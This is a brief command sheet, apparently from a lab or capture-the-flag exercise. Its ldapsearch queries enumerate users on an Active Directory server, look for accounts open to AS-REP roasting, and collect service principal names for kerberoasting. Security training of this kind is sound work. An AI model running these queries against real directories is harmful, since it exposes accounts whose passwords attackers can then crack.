# 0) Confirm the naming context
ldapsearch -x -H ldap://10.30.7.10:3268 -s base -b "" -LLL defaultNamingContext

# 1) List user objects (full subtree)
ldapsearch -x -H ldap://10.30.7.10:3268 -b "DC=hero,DC=local" -s sub -LLL \
'(objectClass=user)' sAMAccountName userPrincipalName servicePrincipalName

# (tighter AD-style user filter; excludes computers)
ldapsearch -x -H ldap://10.30.7.10:3268 -b "DC=hero,DC=local" -s sub -LLL \
'(&(objectCategory=Person)(objectClass=User))' sAMAccountName userPrincipalName

# 2) Hunt AS-REP roastable accounts (no preauth)
ldapsearch -x -H ldap://10.30.7.10:3268 -b "DC=hero,DC=local" -s sub -LLL \
'(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName

# 3) Pull SPNs for kerberoast (works best with creds, but enumerate anyway)
ldapsearch -x -H ldap://10.30.7.10:3268 -b "DC=hero,DC=local" -s sub -LLL \
'(servicePrincipalName=*)' sAMAccountName servicePrincipalName
